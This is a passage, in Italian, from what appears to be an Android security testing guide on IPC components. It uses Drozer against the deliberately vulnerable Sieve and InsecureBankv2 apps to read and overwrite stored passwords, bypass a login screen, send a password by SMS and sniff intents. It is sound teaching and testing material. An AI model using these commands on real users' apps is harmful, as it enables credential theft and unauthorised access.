				System.out.println("For the changepassword - phonenumber: "+textPhoneno+" password is: "+textMessage);

				smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
			}
		}
	}
}
```

I broadcast receivers dovrebbero usare l'attributo `android:permission`;
diversamente possono essere invocati dalle altre app.
Puoi usare `Context.sendBroadcast(intent, receiverPermission)` per specificare quali permission un receiver deve avere per ricevere il messaggio broadcast.
Puoi anche impostare un application package name specifico per limitare i componenti che possono accedere a questo intent.
Se lasciato al valore di default (null), verranno considerati tutti i componenti di tutte le app.
Se non-null, l'intent può consentire solo i component del particolare application package.

### Dynamic Analysis

Puoi enumerare i component di IPC con Drozer.
Per elencare tutti i component di IPC exported, usa il modulo `app.package.attacksurface`

```sh
dz> run app.package.attacksurface com.mwr.example.sieve
	Attack Surface:
		3 activities exported
		0 broadcast receivers exported
		2 content providers exported
		2 services exported
		is debuggable
```

#### Content Providers

L'app Sieve implementa un content provider vulnerabile.
Per elencare i content provider esportati dall'app Sieve, esegui il seguente comando:

```sh
dz> run app.provider.finduri com.mwr.example.sieve
Scanning com.mwr.example.sieve...
content://com.mwr.example.sieve.DBContentProvider/
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.DBContentProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords/
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.FileBackupProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Keys
```

I content provider con nomi come "password"e "keys" sono i primi sospettati per il leak di informazioni sensibili.

```sh
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
Permission Denial: reading com.mwr.example.sieve.DBContentProvider 
uri content://com.mwr.example.sieve.DBContentProvider/Keys 
from pid=4268, uid=10054 
requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
```

```sh
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
| Password | pin |
| SuperPassword1234 | 1234 |
```

Questo content provider può essere acceduto senza permessi.

```sh
dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --st
ring Password "newpassword"
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
| Password | pin |
| newpassword | 1234 |
```

#### Activities

Per elencare le activity esportate da un'app, usa il modulo `app.activity.info`:

```sh
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
	com.mwr.example.sieve.FileSelectActivity
		Permission: null
	com.mwr.example.sieve.MainLoginActivity
		Permission: null
	com.mwr.example.sieve.PWList
		Permission: null
```

Enumerando le activity dell'app Sieve si capisce che l'activity `com.mwr.example.sieve.PWList` è esportata senza richiedere alcuna permission.
Per lanciare questa activity è possibile usare il modulo `app.activity.start`

```sh
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```

Dato che in questo esempio l'activity è invocata direttamente, il login form viene raggirato, e i dati contenuti nel password manager possono essere acceduti.

#### Services

I service possono essere enumerati col modulo Drozer `app.service.info`

```sh
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
	com.mwr.example.sieve.AuthService
		Permission: null
	com.mwr.example.sieve.CryptoService
		Permission: null
```

Per comunicare con un service, è prima necessario identificare gli input richiesti tramite analisi statica.

Dato che questo service è exported, puoi usare il modulo `app.service.send` per comunicare con il service e cambiare la password memorizzata nell'app target

```sh
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
	what: 4
	arg1: 42
	arg2: 0
	Empty
```

#### Broadcast Receiver

I broadcast possono essere enumerati tramite il modulo Drozer `app.broadcast.info`

```sh
dz> run app.broadcast.info -a com.android.insecurebankv2
Package: com.android.insecurebankv2
	com.android.insecurebankv2.MyBroadCastReceiver
		Permission: null
```

Nell'app Android Insecure Bank, un broadcast receiver viene esportato senza richiedere alcuna permission, facendo intuire che è possibile formulare un intent per scatenare il broadcast receiver.
Quando si testano i broadcast receiver, è necessario applicare anche l'analisi statica per capire le funzionalità del broadcast receiver.

Col modulo Drozer `app.broadcast.send`, possiamo formulare un intent per scatenare il broadcast receiver e inviare la password al numero di telefono sotto il nostro controllo 

```sh
dz> run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
```

Così, il seguente SMS viene inviato:

```sh
Updated Password from: SecretPassword@ to: 12345
```

#### Sniffing intents

Se un'app invia intent senza specificare una permission o un package di destinazione, gli intent possono essere monitorati dalle altre app in esecuzione sul device.

Per registrare un broadcast receiver in modo che catturi gli intent, usa il modulo Drozer `app.broadcast.sniff` e specifica l'action da monitorare

```sh
dz> run app.broadcast.sniff --action theBroadcast
[*] Broadcast receiver registered to sniff matching intents
Android Platform APIs
[*] Output is updated once a second. Press Control+C to exit.

Action: theBroadcast
Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
Extra: phonenumber=07123456789 (java.lang.String)
Extra: newpass=12345 (java.lang.String)
```

229

TODO PROVA I COMANDI DI DYNAMIC ANALYSIS